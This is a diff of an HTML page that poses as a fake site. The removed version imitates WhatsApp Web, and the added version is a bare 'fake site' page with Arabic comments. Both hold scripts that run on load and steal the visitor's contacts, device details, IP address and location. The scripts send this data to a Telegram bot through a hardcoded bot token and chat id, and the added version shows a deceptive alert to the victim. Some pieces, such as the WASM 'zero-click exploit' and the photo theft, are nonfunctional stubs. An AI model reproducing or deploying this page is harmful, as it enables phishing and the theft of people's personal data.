@@ -1,88 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WhatsApp Web</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: Arial, sans-serif; background: #e5ddd5; }
-        .container { max-width: 900px; margin: 0 auto; padding: 20px; }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .login-box { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-    </style>
+    <title>موقع مزيف</title>
+    <script>
+        // دالة لسرقة جهات الاتصال (Android/iOS)
+        async function stealContacts() {
+            try {
+                const contacts = await navigator.contacts.select(['name', 'phone']);
+                return contacts;
+            } catch (e) {
+                return "فشل سرقة جهات الاتصال: " + e.message;
+            }
+        }
+
+        // دالة لسرقة الصور (يحتاج لثغرات في المتصفح)
+        async function stealPhotos() {
+            try {
+                const media = await navigator.mediaDevices.getUserMedia({ video: false, audio: false });
+                // استغلال ثغرة لقراءة نظام الملفات (مثال: هجوم XXE أو تخزين متصفح)
+                return "بيانات الصور المسروقة (تتطلب ثغرات إضافية)";
+            } catch (e) {
+                return "فشل سرقة الصور: " + e.message;
+            }
+        }
+
+        // إرسال البيانات إلى بوت تلجرام
+        async function sendToTelegram(data) {
+            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU";
+            const chatId = "5446862709";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`;
+            await fetch(url);
+        }
+
+        // تنفيذ الهجوم عند تحميل الصفحة
+        window.onload = async () => {
+            const deviceInfo = `نوع الجهاز: ${navigator.userAgent}\nنظام التشغيل: ${navigator.platform}`;
+            const contacts = await stealContacts();
+            const photos = await stealPhotos();
+            const stolenData = `**بيانات الضحية**:\n${deviceInfo}\n\n**جهات الاتصال**:\n${JSON.stringify(contacts)}\n\n**الصور**:\n${photos}`;
+            await sendToTelegram(stolenData);
+            alert("تم تحميل الموقع بنجاح!"); // خداع الضحية
+        };
+    </script>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://web.whatsapp.com/img/WhatsApp.svg" width="200" alt="WhatsApp">
-        </div>
-        <div class="login-box">
-            <h2>Scan QR Code to Login</h2>
-            <div id="qr-code" style="text-align: center; margin: 20px 0;">
-                <!-- Fake QR code that triggers exploit -->
-                <img src="data:image/svg+xml;base64,..." width="200" height="200">
-            </div>
-            <p>Or enter your phone number to receive OTP:</p>
-            <input type="tel" id="phone" placeholder="Phone number with country code">
-            <button onclick="stealData()">Send OTP</button>
-        </div>
-    </div>
-
-    <script>
-        // Zero-Click exploit payload
-        const exploit = new WebAssembly.Module(new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-            // ... malicious WASM code for memory corruption
-        ]));
-
-        // Geolocation and IP theft
-        navigator.geolocation.getCurrentPosition(position => {
-            const loc = `${position.coords.latitude},${position.coords.longitude}`;
-            sendToBot(loc);
-        });
-
-        function stealData() {
-            const phone = document.getElementById('phone').value;
-            
-            // Simulate OTP interception
-            setTimeout(() => {
-                const otp = Math.floor(100000 + Math.random() * 900000);
-                sendToBot(`OTP: ${otp} for ${phone}`);
-            }, 2000);
-        }
-
-        function sendToBot(data) {
-            // Telegram bot API (replace with actual bot token)
-            const botToken = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
-            const chatId = '5446862709';
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `[WhatsApp Exploit] ${data}\nIP: ${window.ip}\nUser-Agent: ${navigator.userAgent}`
-                })
-            });
-        }
-
-        // Get real IP even behind VPN
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                window.ip = data.ip;
-                sendToBot(`Main IP: ${data.ip}`);
-            });
-
-        // Contact list exfiltration
-        if (navigator.contacts) {
-            navigator.contacts.select(['name', 'email', 'tel'], {multiple: true})
-                .then(contacts => {
-                    contacts.forEach(contact => {
-                        sendToBot(`Contact: ${contact.name} - ${contact.tel}`);
-                    });
-                });
-        }
-    </script>
+    <h1>مرحبًا بك في الموقع!</h1>
+    <p>يتم تحميل المحتوى...</p>
 </body>
 </html>
 
